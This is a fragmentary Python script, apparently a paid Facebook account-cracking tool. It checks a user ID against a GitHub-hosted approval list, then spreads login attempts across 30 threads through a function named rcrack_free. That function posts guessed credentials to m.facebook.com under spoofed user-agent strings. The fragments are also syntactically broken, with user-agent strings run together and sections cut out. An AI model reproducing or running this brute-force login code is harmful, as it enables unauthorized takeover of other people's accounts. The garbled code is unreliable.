...
\033[91;1m--------------------------------------------------""")
  ...
  try:
    httpCaht = requests.get(f"https://github.com/KgHasan/Hasan-paid/blob/main/Approved.txt").text
    if id in httpCaht:
...
def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "→".join(uuid)
	server = requests.get(f'https://github.com/KgHasan/Hasan-paid/blob/main/Approved.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/KgHasan/Hasan-paid/blob/main/Approved.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
...
def gml():
                ...
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Total account : \033[1;32m'+tl)
                        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Choice code :\033[1;32m '+code)
                        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Random Testing Version ')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41'}
			lo = session.post('https://m.facebook.com/profile.php?eav=Afb72q9ywTBO1_W6YYWu9N9TIBA53Palk1l2FkAGCes8Ym9FYt-dt87Hy3_uOHViHv4&paipv=0',data=log_data,headers=header_freefb).text
